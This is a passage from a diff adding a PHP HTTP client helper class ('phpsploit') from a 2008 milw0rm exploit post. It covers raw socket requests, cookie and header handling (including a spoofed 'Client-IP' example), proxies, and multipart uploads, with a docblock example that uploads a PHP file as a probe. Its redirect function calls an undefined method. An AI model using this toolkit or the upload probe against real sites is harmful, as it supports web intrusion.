+		fputs($socket,$this->packet);
+
+		while(!feof($socket))
+		   $this->recv .= fgets($socket);
+
+		fclose($socket);
+
+		if($this->cookiejar)
+		   $this->getcookie();
+
+		if($this->allowredirection)
+		   return $this->getredirection();
+		else
+		   return $this->recv;
+	}
+	
+
+	/**
+	 * This function allows you to add several
+	 * cookies in the request.
+	 * 
+	 * @access  public
+	 * @param   string cookn CookieName
+	 * @param   string cookv CookieValue
+	 * @example $this->addcookie('name','value')
+	 * 
+	 */
+	function addcookie($cookn,$cookv)
+	{
+		if(!isset($this->cookie))
+		   $this->cookie = array();
+
+		$this->cookie[$cookn] = $cookv;
+	}
+
+
+	/**
+	 * This function allows you to add several
+	 * headers in the request.
+	 *
+	 * @access  public
+	 * @param   string headern HeaderName
+	 * @param   string headervalue Headervalue
+	 * @example $this->addheader('Client-IP', '128.5.2.3')
+	 * 
+	 */
+	function addheader($headern,$headervalue)
+	{
+		if(!isset($this->header))
+		   $this->header = array();
+		   
+		$this->header[$headern] = $headervalue;
+	}
+
+
+	/**
+	 * This function allows you to use an
+	 * http proxy server. Several methods
+	 * are supported.
+	 * 
+	 * @access  public
+	 * @param   string proxy ProxyHost
+	 * @param   integer proxyp ProxyPort
+	 * @example $this->proxy('localhost',8118)
+	 * @example $this->proxy('localhost:8118')
+	 * 
+	 */
+	function proxy($proxy,$proxyp='')
+	{
+		if(empty($proxyp))
+		{
+			$proxarr = explode(':',$proxy);
+			$this->proxyhost = $proxarr[0];
+			$this->proxyport = (int)$proxarr[1];
+		}
+		else 
+		{
+			$this->proxyhost = $proxy;
+			$this->proxyport = (int)$proxyp;
+		}
+
+		if($this->proxyport > 65535)
+		   die("Error: Invalid port number");
+	}
+	
+
+	/**
+	 * This function allows you to use an
+	 * http proxy server which requires a
+	 * basic authentification. Several
+	 * methods are supported:
+	 *
+	 * @access  public
+	 * @param   string proxyauth ProxyUser
+	 * @param   string proxypass ProxyPass
+	 * @example $this->proxyauth('user','pwd')
+	 * @example $this->proxyauth('user:pwd');
+	 * 
+	 */
+	function proxyauth($proxyauth,$proxypass='')
+	{
+		if(empty($proxypass))
+		{
+			$posvirg = strpos($proxyauth,':');
+			$this->proxyuser = substr($proxyauth,0,$posvirg);
+			$this->proxypass = substr($proxyauth,$posvirg+1);
+		}
+		else
+		{
+			$this->proxyuser = $proxyauth;
+			$this->proxypass = $proxypass;
+		}
+	}
+
+
+	/**
+	 * This function allows you to set
+	 * the 'User-Agent' header.
+	 * 
+	 * @access  public
+	 * @param   string useragent Agent
+	 * @example $this->agent('Firefox')
+	 * 
+	 */
+	function agent($useragent)
+	{
+		$this->addheader('User-Agent',$useragent);
+	}
+
+	
+	/**
+	 * This function returns the headers
+	 * which will be in the next request.
+	 * 
+	 * @access  public
+	 * @return  string $this->header_str Headers
+	 * @example $this->showheader()
+	 * 
+	 */
+	function showheader()
+	{
+		$this->header_str = '';
+		
+		if(!isset($this->header))
+		   return;
+		   
+		foreach($this->header as $name => $value)
+		   $this->header_str .= $name.': '.$value."\r\n";
+		   
+		return $this->header_str;
+	}
+
+	
+	/**
+	 * This function returns the cookies
+	 * which will be in the next request.
+	 * 
+	 * @access  public
+	 * @return  string $this->cookie_str Cookies
+	 * @example $this->showcookie()
+	 * 
+	 */
+	function showcookie()
+	{
+		$this->cookie_str = '';
+		
+		if(!isset($this->cookie))
+		   return;
+		
+		foreach($this->cookie as $name => $value)
+		   $this->cookie_str .= $name.'='.$value.'; ';
+
+		return $this->cookie_str;
+	}
+
+
+	/**
+	 * This function returns the last
+	 * formed http request.
+	 * 
+	 * @access  public
+	 * @return  string $this->packet HttpPacket
+	 * @example $this->showlastrequest()
+	 * 
+	 */
+	function showlastrequest()
+	{
+		if(!isset($this->packet))
+		   return;
+		else
+		   return $this->packet;
+	}
+
+
+	/**
+	 * This function sends the formed
+	 * http packet with the GET method.
+	 * 
+	 * @access  public
+	 * @param   string url Url
+	 * @return  string $this->sock()
+	 * @example $this->url('localhost/index.php?var=x')
+	 * @example $this->url('http://localhost:88/tst.php')
+	 * 
+	 */
+	function get($url)
+	{
+		$this->target($url);
+		$this->method = 'get';
+		return $this->sock();
+	}
+
+	
+	/**
+	 * This function sends the formed
+	 * http packet with the POST method.
+	 *
+	 * @access  public
+	 * @param   string url  Url
+	 * @param   string data PostData
+	 * @return  string $this->sock()
+	 * @example $this->post('http://localhost/','helo=x')
+	 * 
+	 */	
+	function post($url,$data)
+	{
+		$this->target($url);
+		$this->method = 'post';
+		$this->data = $data;
+		return $this->sock();
+	}
+	
+
+	/**
+	 * This function sends the formed http
+	 * packet with the POST method using
+	 * the multipart/form-data enctype.
+	 * 
+	 * @access  public
+	 * @param   array array FormDataArray
+	 * @return  string $this->sock()
+	 * @example $formdata = array(
+	 *                      frmdt_url => 'http://localhost/upload.php',
+	 *                      frmdt_boundary => '123456', # Optional
+	 *                      'var' => 'example',
+	 *                      'file' => array(
+	 *                                frmdt_type => 'image/gif',  # Optional
+	 *                                frmdt_transfert => 'binary' # Optional
+	 *                                frmdt_filename => 'hello.php,
+	 *                                frmdt_content => '<?php echo 1; ?>'));
+	 *          $this->formdata($formdata);
+	 * 
+	 */
+	function formdata($array)
+	{
+		$this->target($array[frmdt_url]);
+		$this->method = 'formdata';
+		$this->data = '';
+		
+		if(!isset($array[frmdt_boundary]))
+		   $this->boundary = 'phpsploit';
+		else
+		   $this->boundary = $array[frmdt_boundary];
+
+		foreach($array as $key => $value)
+		{
+			if(!preg_match('#^frmdt_(boundary|url)#',$key))
+			{
+				$this->data .= str_repeat('-',29).$this->boundary."\r\n";
+				$this->data .= 'Content-Disposition: form-data; name="'.$key.'";';
+				
+				if(!is_array($value))
+				{
+					$this->data .= "\r\n\r\n".$value."\r\n";
+				}
+				else
+				{
+					$this->data .= ' filename="'.$array[$key][frmdt_filename]."\";\r\n";
+
+					if(isset($array[$key][frmdt_type]))
+					   $this->data .= 'Content-Type: '.$array[$key][frmdt_type]."\r\n";
+
+					if(isset($array[$key][frmdt_transfert]))
+					   $this->data .= 'Content-Transfer-Encoding: '.$array[$key][frmdt_transfert]."\r\n";
+
+					$this->data .= "\r\n".$array[$key][frmdt_content]."\r\n";
+				}
+			}
+		}
+
+		$this->data .= str_repeat('-',29).$this->boundary."--\r\n";
+		return $this->sock();
+	}
+
+	
+	/**
+	 * This function returns the content
+	 * of the server response, without
+	 * the headers.
+	 * 
+	 * @access  public
+	 * @param   string code ServerResponse
+	 * @return  string $this->server_content
+	 * @example $this->getcontent()
+	 * @example $this->getcontent($this->url('http://localhost/'))
+	 * 
+	 */
+	function getcontent($code='')
+	{
+		if(empty($code))
+		   $code = $this->recv;
+
+		$code = explode("\r\n\r\n",$code);
+		$this->server_content = '';
+		
+		for($i=1;$i<count($code);$i++)
+		   $this->server_content .= $code[$i];
+
+		return $this->server_content;
+	}
+
+	
+	/**
+	 * This function returns the headers
+	 * of the server response, without
+	 * the content.
+	 * 
+	 * @access  public
+	 * @param   string code ServerResponse
+	 * @return  string $this->server_header
+	 * @example $this->getcontent()
+	 * @example $this->getcontent($this->post('http://localhost/','1=2'))
+	 * 
+	 */
+	function getheader($code='')
+	{
+		if(empty($code))
+		   $code = $this->recv;
+
+		$code = explode("\r\n\r\n",$code);
+		$this->server_header = $code[0];
+		
+		return $this->server_header;
+	}
+
+	
+	/**
+	 * This function is called by the
+	 * cookiejar() function. It adds the
+	 * value of the "Set-Cookie" header
+	 * in the "Cookie" header for the
+	 * next request. You don't have to
+	 * call it.
+	 * 
+	 * @access private
+	 * @param  string code ServerResponse
+	 * 
+	 */
+	function getcookie()
+	{
+		foreach(explode("\r\n",$this->getheader()) as $header)
+		{
+			if(preg_match('/set-cookie/i',$header))
+			{
+				$fequal = strpos($header,'=');
+				$fvirgu = strpos($header,';');
+				
+				// 12=strlen('set-cookie: ')
+				$cname  = substr($header,12,$fequal-12);
+				$cvalu  = substr($header,$fequal+1,$fvirgu-(strlen($cname)+12+1));
+				
+				$this->cookie[trim($cname)] = trim($cvalu);
+			}
+		}
+	}
+
+
+	/**
+	 * This function is called by the
+	 * get()/post() functions. You
+	 * don't have to call it.
+	 *
+	 * @access  private
+	 * @param   string urltarg Url
+	 * @example $this->target('http://localhost/')
+	 * 
+	 */
+	function target($urltarg)
+	{
+		if(!ereg('^http://',$urltarg))
+		   $urltarg = 'http://'.$urltarg;
+		   
+		$urlarr     = parse_url($urltarg);
+		$this->url  = 'http://'.$urlarr['host'].$urlarr['path'];
+		
+		if(isset($urlarr['query']))
+		   $this->url .= '?'.$urlarr['query'];
+		
+		$this->port = !empty($urlarr['port']) ? $urlarr['port'] : 80;
+		$this->host = $urlarr['host'];
+		
+		if($this->port != '80')
+		   $this->host .= ':'.$this->port;
+
+		if(!isset($urlarr['path']) or empty($urlarr['path']))
+		   die("Error: No path precised");
+
+		$this->path = substr($urlarr['path'],0,strrpos($urlarr['path'],'/')+1);
+
+		if($this->port > 65535)
+		   die("Error: Invalid port number");
+	}
+	
+	
+	/**
+	 * If you call this function,
+	 * the script will extract all
+	 * 'Set-Cookie' headers values
+	 * and it will automatically add
+	 * them into the 'Cookie' header
+	 * for all next requests.
+	 *
+	 * @access  public
+	 * @param   integer code 1(enabled) 0(disabled)
+	 * @example $this->cookiejar(0)
+	 * @example $this->cookiejar(1)
+	 * 
+	 */
+	function cookiejar($code)
+	{
+		if($code=='0')
+		   $this->cookiejar=FALSE;
+
+		elseif($code=='1')
+		   $this->cookiejar=TRUE;
+	}
+
+
+	/**
+	 * If you call this function,
+	 * the script will follow all
+	 * redirections sent by the server.
+	 * 
+	 * @access  public
+	 * @param   integer code 1(enabled) 0(disabled)
+	 * @example $this->allowredirection(0)
+	 * @example $this->allowredirection(1)
+	 * 
+	 */
+	function allowredirection($code)
+	{
+		if($code=='0')
+		   $this->allowredirection=FALSE;
+		   
+		elseif($code=='1')
+		   $this->allowredirection=TRUE;
+	}
+
+	
+	/**
+	 * This function is called if
+	 * allowredirection() is enabled.
+	 * You don't have to call it.
+	 *
+	 * @access private
+	 * @return string $this->url('http://'.$this->host.$this->path.$this->last_redirection)
+	 * @return string $this->url($this->last_redirection)
+	 * @return string $this->recv;
+	 * 
+	 */
+	function getredirection()
+	{
+		if(preg_match('/(location|content-location|uri): (.*)/i',$this->getheader(),$codearr))
+		{
+			$this->last_redirection = trim($codearr[2]);
+			
+			if(!ereg('://',$this->last_redirection))
+			   return $this->url('http://'.$this->host.$this->path.$this->last_redirection);
+
+			else
+			   return $this->url($this->last_redirection);
+		}
+		else
+		   return $this->recv;
+	}
+
+
+	/**
+	 * This function allows you
+	 * to reset some parameters.
+	 * 
+	 * @access  public
+	 * @param   string func Param
+	 * @example $this->reset('header')
+	 * @example $this->reset('cookie')
+	 * @example $this->reset()
+	 * 
+	 */
+	function reset($func='')
+	{
+		switch($func)
+		{
+			case 'header':
+			$this->header = array();
+			break;
+				
+			case 'cookie':
+			$this->cookie = array();
+			break;
+				
+			default:
+			$this->cookiejar = '';
+			$this->header = array();
+			$this->cookie = array();
+			$this->allowredirection = '';
+			break;
+		}
+	}
+}
+
+?>
+
+# milw0rm.com [2008-11-04]
